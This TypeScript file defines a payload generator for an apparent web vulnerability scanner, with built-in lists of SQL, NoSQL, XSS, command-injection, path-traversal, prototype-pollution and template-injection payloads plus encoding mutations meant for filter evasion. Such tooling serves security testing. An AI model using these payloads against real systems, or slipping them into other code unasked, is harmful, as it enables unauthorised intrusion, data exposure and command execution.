import { Parameter } from './parameterTester';
import { logger } from '../utils/logger';

export interface AIPayload {
  value: any;
  technique: string;
  category: string;
  description: string;
  confidence: number;
  complexity: 'basic' | 'intermediate' | 'advanced' | 'expert';
  tags: string[];
  source: 'static' | 'ai_generated' | 'context_aware' | 'ml_enhanced';
}

export interface PayloadContext {
  parameterName: string;
  parameterType: string;
  endpoint: string;
  method: string;
  applicationContext?: {
    framework?: string;
    database?: string;
    language?: string;
    platform?: string;
  };
  previousFindings?: Array<{
    type: string;
    parameter: string;
    success: boolean;
  }>;
}

export class AIPayloadGenerator {
  
  // ML-Enhanced payload patterns based on real-world attack data
  private readonly mlPatterns = {
    sql_injection: {
      authentication_bypass: [
        "' OR '1'='1' --",
        "' OR 1=1#",
        "admin'--",
        "' OR 'x'='x",
        "') OR ('1'='1'--",
        "' OR 1=1 LIMIT 1--"
      ],
      union_based: [
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT null,version(),null--",
        "' UNION SELECT @@version,@@datadir,@@hostname--",
        "' UNION ALL SELECT 1,2,3,4,5--"
      ],
      time_based: [
        "'; WAITFOR DELAY '00:00:05'--",
        "' OR SLEEP(5)--",
        "'; SELECT BENCHMARK(5000000,MD5(1))--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
      ],
      error_based: [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
        "' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
      ]
    },
    
    nosql_injection: {
      mongodb: [
        { "$ne": null },
        { "$regex": ".*" },
        { "$where": "1==1" },
        { "$gt": "" },
        { "$exists": true },
        { "$in": ["admin", "user", "guest"] },
        { "$or": [{"username": "admin"}, {"role": "admin"}] }
      ],
      couchdb: [
        { "selector": { "$gt": null } },
        { "selector": { "$regex": ".*" } }
      ]
    },

    xss: {
      stored: [
        "<script>alert('Stored XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>"
      ],
      reflected: [
        "'\"><script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>"
      ],
      dom_based: [
        "#<script>alert('DOM XSS')</script>",
        "javascript:alert(document.domain)",
        "<img src=1 onerror=alert(document.cookie)>"
      ],
      bypass: [
        "<SCRiPT>alert('XSS')</SCRiPT>",
        "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<svg><script>alert&#40;1&#41;</script>"
      ]
    },

    command_injection: {
      unix: [
        "; cat /etc/passwd",
        "| whoami",
        "&& id",
        "`id`",
        "$(whoami)",
        "; ls -la /",
        "|| uname -a"
      ],
      windows: [
        "& dir",
        "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "&& whoami",
        "; systeminfo"
      ]
    }
  };

  // Context-aware payload enhancement
  private readonly contextualEnhancements = {
    email: {
      patterns: ['@', 'mail', 'user'],
      payloads: [
        'admin@localhost.localdomain',
        '"<script>alert(1)</script>"@evil.com',
        'user+<script>alert(1)</script>@domain.com'
      ]
    },
    
    id: {
      patterns: ['id', 'user', 'account'],
      payloads: [
        '../admin',
        '0',
        '1 OR 1=1',
        { "$ne": null },
        'null'
      ]
    },
    
    password: {
      patterns: ['pass', 'pwd', 'secret'],
      payloads: [
        '',
        { "$ne": null },
        { "$regex": ".*" },
        "' OR '1'='1",
        'null'
      ]
    },
    
    filename: {
      patterns: ['file', 'path', 'name', 'document'],
      payloads: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        'file:///etc/passwd',
        'php://filter/read=convert.base64-encode/resource=../../../etc/passwd'
      ]
    }
  };

  // Framework-specific payloads
  private readonly frameworkPayloads = {
    express: {
      prototype_pollution: [
        { "__proto__.isAdmin": true },
        { "constructor.prototype.isAdmin": true }
      ]
    },
    
    spring: {
      spel_injection: [
        "${7*7}",
        "#{7*7}",
        "${T(java.lang.Runtime).getRuntime().exec('whoami')}"
      ]
    },
    
    django: {
      template_injection: [
        "{{7*7}}",
        "{% load os %}{{os.system('whoami')}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}"
      ]
    }
  };

  async generatePayloads(parameter: Parameter, context: PayloadContext): Promise<AIPayload[]> {
    logger.info(`Generating AI-enhanced payloads for parameter: ${parameter.name}`);
    
    const payloads: AIPayload[] = [];

    try {
      // 1. Static pattern-based payloads
      const staticPayloads = this.generateStaticPayloads(parameter);
      payloads.push(...staticPayloads);

      // 2. Context-aware payloads
      const contextPayloads = this.generateContextAwarePayloads(parameter, context);
      payloads.push(...contextPayloads);

      // 3. ML-enhanced payloads
      const mlPayloads = await this.generateMLEnhancedPayloads(parameter, context);
      payloads.push(...mlPayloads);

      // 4. Framework-specific payloads
      if (context.applicationContext?.framework) {
        const frameworkPayloads = this.generateFrameworkSpecificPayloads(
          parameter, 
          context.applicationContext.framework
        );
        payloads.push(...frameworkPayloads);
      }

      // 5. Mutation-based payloads
      const mutatedPayloads = this.generateMutationPayloads(parameter, payloads.slice(0, 10));
      payloads.push(...mutatedPayloads);

      // 6. Sort by confidence and complexity
      return this.prioritizePayloads(payloads);

    } catch (error: any) {
      logger.error(`Payload generation failed: ${error.message}`);
      return [];
    }
  }

  private generateStaticPayloads(parameter: Parameter): AIPayload[] {
    const payloads: AIPayload[] = [];

    // SQL Injection payloads
    if (parameter.type === 'string') {
      this.mlPatterns.sql_injection.authentication_bypass.forEach(payload => {
        payloads.push({
          value: payload,
          technique: 'SQL Injection - Authentication Bypass',
          category: 'injection',
          description: 'Attempts to bypass authentication using SQL injection',
          confidence: 0.8,
          complexity: 'intermediate',
          tags: ['sql', 'authentication', 'bypass'],
          source: 'static'
        });
      });

      this.mlPatterns.sql_injection.union_based.forEach(payload => {
        payloads.push({
          value: payload,
          technique: 'SQL Injection - UNION Based',
          category: 'injection',
          description: 'UNION-based SQL injection for data extraction',
          confidence: 0.85,
          complexity: 'advanced',
          tags: ['sql', 'union', 'data_extraction'],
          source: 'static'
        });
      });
    }

    // NoSQL Injection payloads
    if (parameter.type === 'object' || parameter.type === 'string') {
      this.mlPatterns.nosql_injection.mongodb.forEach(payload => {
        payloads.push({
          value: payload,
          technique: 'NoSQL Injection - MongoDB',
          category: 'injection',
          description: 'MongoDB-specific NoSQL injection payload',
          confidence: 0.75,
          complexity: 'intermediate',
          tags: ['nosql', 'mongodb', 'bypass'],
          source: 'static'
        });
      });
    }

    // XSS payloads
    if (parameter.type === 'string') {
      this.mlPatterns.xss.stored.forEach(payload => {
        payloads.push({
          value: payload,
          technique: 'Cross-Site Scripting - Stored',
          category: 'injection',
          description: 'Stored XSS payload for persistent attacks',
          confidence: 0.9,
          complexity: 'intermediate',
          tags: ['xss', 'stored', 'persistent'],
          source: 'static'
        });
      });

      this.mlPatterns.xss.bypass.forEach(payload => {
        payloads.push({
          value: payload,
          technique: 'Cross-Site Scripting - Filter Bypass',
          category: 'injection',
          description: 'XSS payload designed to bypass common filters',
          confidence: 0.7,
          complexity: 'advanced',
          tags: ['xss', 'bypass', 'evasion'],
          source: 'static'
        });
      });
    }

    return payloads;
  }

  private generateContextAwarePayloads(parameter: Parameter, context: PayloadContext): AIPayload[] {
    const payloads: AIPayload[] = [];
    const paramName = parameter.name.toLowerCase();

    // Enhanced context detection
    for (const [contextType, config] of Object.entries(this.contextualEnhancements)) {
      if (config.patterns.some(pattern => paramName.includes(pattern))) {
        config.payloads.forEach(payload => {
          payloads.push({
            value: payload,
            technique: `Context-Aware - ${contextType.charAt(0).toUpperCase() + contextType.slice(1)}`,
            category: 'context_specific',
            description: `Payload specifically crafted for ${contextType} parameters`,
            confidence: 0.85,
            complexity: 'intermediate',
            tags: ['context_aware', contextType, 'targeted'],
            source: 'context_aware'
          });
        });
      }
    }

    // Endpoint-specific context analysis
    if (context.endpoint.includes('/api/')) {
      payloads.push({
        value: { "version": "../../../../etc/passwd" },
        technique: 'API Path Traversal',
        category: 'traversal',
        description: 'Path traversal attempt specific to API endpoints',
        confidence: 0.7,
        complexity: 'intermediate',
        tags: ['api', 'path_traversal', 'file_access'],
        source: 'context_aware'
      });
    }

    if (context.method === 'POST' && parameter.location === 'body') {
      payloads.push({
        value: { "__proto__": { "isAdmin": true } },
        technique: 'Prototype Pollution',
        category: 'logic',
        description: 'Prototype pollution attempt in POST body',
        confidence: 0.6,
        complexity: 'advanced',
        tags: ['prototype_pollution', 'post', 'logic'],
        source: 'context_aware'
      });
    }

    return payloads;
  }

  private async generateMLEnhancedPayloads(parameter: Parameter, context: PayloadContext): Promise<AIPayload[]> {
    // Simulated ML-enhanced payload generation
    // In a real implementation, this would use trained ML models
    const payloads: AIPayload[] = [];

    try {
      // Pattern learning from previous findings
      if (context.previousFindings && context.previousFindings.length > 0) {
        const successfulTechniques = context.previousFindings
          .filter(f => f.success)
          .map(f => f.type);

        if (successfulTechniques.includes('sql_injection')) {
          // Generate enhanced SQL payloads based on successful patterns
          payloads.push({
            value: `' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='${context.parameterName}')>0--`,
            technique: 'ML-Enhanced SQL Injection',
            category: 'injection',
            description: 'Machine learning generated SQL injection based on successful patterns',
            confidence: 0.9,
            complexity: 'expert',
            tags: ['ml_generated', 'sql', 'adaptive'],
            source: 'ml_enhanced'
          });
        }
      }

      // Parameter type-based ML generation
      if (parameter.type === 'number') {
        // Generate numeric-specific payloads
        payloads.push(
          {
            value: 999999999999999999999,
            technique: 'ML-Enhanced Integer Overflow',
            category: 'overflow',
            description: 'Large integer designed to trigger overflow conditions',
            confidence: 0.6,
            complexity: 'intermediate',
            tags: ['ml_generated', 'overflow', 'numeric'],
            source: 'ml_enhanced'
          },
          {
            value: -999999999999999999999,
            technique: 'ML-Enhanced Negative Overflow',
            category: 'overflow',
            description: 'Large negative integer for underflow testing',
            confidence: 0.6,
            complexity: 'intermediate',
            tags: ['ml_generated', 'underflow', 'numeric'],
            source: 'ml_enhanced'
          }
        );
      }

      // Constraint-based ML payloads
      if (parameter.constraints) {
        if (parameter.constraints.maxLength) {
          const overflowSize = parameter.constraints.maxLength * 3;
          payloads.push({
            value: 'A'.repeat(overflowSize) + '<script>alert("ML-XSS")</script>',
            technique: 'ML-Enhanced Buffer Overflow + XSS',
            category: 'combined',
            description: 'Combined buffer overflow and XSS payload',
            confidence: 0.7,
            complexity: 'expert',
            tags: ['ml_generated', 'combined', 'overflow', 'xss'],
            source: 'ml_enhanced'
          });
        }

        if (parameter.constraints.pattern) {
          // Generate payloads that attempt to bypass regex patterns
          payloads.push({
            value: this.generateRegexBypass(parameter.constraints.pattern),
            technique: 'ML-Enhanced Regex Bypass',
            category: 'bypass',
            description: 'Payload designed to bypass specific regex validation',
            confidence: 0.8,
            complexity: 'advanced',
            tags: ['ml_generated', 'regex_bypass', 'validation'],
            source: 'ml_enhanced'
          });
        }
      }

      // Application context ML enhancement
      if (context.applicationContext?.database === 'mongodb') {
        payloads.push({
          value: { "$where": "function() { return (this.username == 'admin' || this.role == 'admin') }" },
          technique: 'ML-Enhanced MongoDB JavaScript Injection',
          category: 'injection',
          description: 'Advanced MongoDB JavaScript injection targeting admin access',
          confidence: 0.85,
          complexity: 'expert',
          tags: ['ml_generated', 'nosql', 'javascript', 'privilege_escalation'],
          source: 'ml_enhanced'
        });
      }

    } catch (error: any) {
      logger.warn(`ML payload generation error: ${error.message}`);
    }

    return payloads;
  }

  private generateFrameworkSpecificPayloads(parameter: Parameter, framework: string): AIPayload[] {
    const payloads: AIPayload[] = [];

    if (this.frameworkPayloads[framework as keyof typeof this.frameworkPayloads]) {
      const frameworkConfig = this.frameworkPayloads[framework as keyof typeof this.frameworkPayloads];
      
      for (const [technique, payloadList] of Object.entries(frameworkConfig)) {
        (payloadList as any[]).forEach(payload => {
          payloads.push({
            value: payload,
            technique: `${framework} - ${technique.replace('_', ' ').toUpperCase()}`,
            category: 'framework_specific',
            description: `Framework-specific attack targeting ${framework}`,
            confidence: 0.8,
            complexity: 'advanced',
            tags: ['framework_specific', framework, technique],
            source: 'ai_generated'
          });
        });
      }
    }

    return payloads;
  }

  private generateMutationPayloads(parameter: Parameter, basePayloads: AIPayload[]): AIPayload[] {
    const mutatedPayloads: AIPayload[] = [];

    // Mutation techniques
    const mutations = [
      // Case mutations
      (payload: string) => payload.toUpperCase(),
      (payload: string) => payload.toLowerCase(),
      (payload: string) => this.randomCase(payload),
      
      // Encoding mutations
      (payload: string) => encodeURIComponent(payload),
      (payload: string) => this.doubleEncode(payload),
      (payload: string) => this.htmlEncode(payload),
      
      // Character mutations
      (payload: string) => payload.replace(/'/g, '"'),
      (payload: string) => payload.replace(/\s/g, '/**/'),
      (payload: string) => payload.replace(/\s/g, '+'),
      
      // Comment mutations
      (payload: string) => payload.replace(/--/g, '#'),
      (payload: string) => payload.replace(/--/g, '/*'),
    ];

    basePayloads.forEach(basePayload => {
      if (typeof basePayload.value === 'string') {
        mutations.forEach((mutation, index) => {
          try {
            const mutatedValue = mutation(basePayload.value);
            if (mutatedValue !== basePayload.value) {
              mutatedPayloads.push({
                value: mutatedValue,
                technique: `${basePayload.technique} - Mutated`,
                category: basePayload.category,
                description: `Mutated version of ${basePayload.technique} for evasion`,
                confidence: basePayload.confidence * 0.8,
                complexity: 'advanced',
                tags: [...basePayload.tags, 'mutated', 'evasion'],
                source: 'ai_generated'
              });
            }
          } catch (error) {
            // Skip failed mutations
          }
        });
      }
    });

    return mutatedPayloads.slice(0, 20); // Limit mutations
  }

  private prioritizePayloads(payloads: AIPayload[]): AIPayload[] {
    // Sort payloads by confidence and complexity
    return payloads.sort((a, b) => {
      // First by confidence (higher is better)
      if (b.confidence !== a.confidence) {
        return b.confidence - a.confidence;
      }
      
      // Then by complexity (expert > advanced > intermediate > basic)
      const complexityOrder = { expert: 4, advanced: 3, intermediate: 2, basic: 1 };
      return complexityOrder[b.complexity] - complexityOrder[a.complexity];
    });
  }

  private generateRegexBypass(pattern: string): string {
    // Simple regex bypass generation
    // In a real implementation, this would be more sophisticated
    if (pattern.includes('[a-zA-Z]')) {
      return '1\' OR \'1\'=\'1'; // Bypass alphanumeric requirement
    }
    if (pattern.includes('\\d')) {
      return 'admin\' OR \'1\'=\'1'; // Bypass digit requirement
    }
    return '\' OR \'1\'=\'1'; // Generic bypass
  }

  private randomCase(str: string): string {
    return str.split('').map(char => 
      Math.random() > 0.5 ? char.toUpperCase() : char.toLowerCase()
    ).join('');
  }

  private doubleEncode(str: string): string {
    return encodeURIComponent(encodeURIComponent(str));
  }

  private htmlEncode(str: string): string {
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
  }

  // Advanced payload analysis
  async analyzePayloadEffectiveness(
    parameter: Parameter,
    payload: AIPayload,
    response: any,
    baseline: any
  ): Promise<{ effectiveness: number; reasoning: string }> {
    
    let effectiveness = 0;
    const reasons: string[] = [];

    // Response time analysis
    if (response.responseTime > baseline.responseTime * 2) {
      effectiveness += 0.3;
      reasons.push('Significant response time increase detected');
    }

    // Status code analysis
    if (response.statusCode !== baseline.statusCode) {
      effectiveness += 0.2;
      reasons.push('Status code change detected');
    }

    // Error signature analysis
    if (response.errorSignatures && response.errorSignatures.length > 0) {
      effectiveness += 0.4;
      reasons.push(`Error signatures detected: ${response.errorSignatures.join(', ')}`);
    }

    // Content analysis
    if (response.responseSize !== baseline.responseSize) {
      effectiveness += 0.1;
      reasons.push('Response size difference detected');
    }

    return {
      effectiveness: Math.min(effectiveness, 1.0),
      reasoning: reasons.join('; ')
    };
  }
} 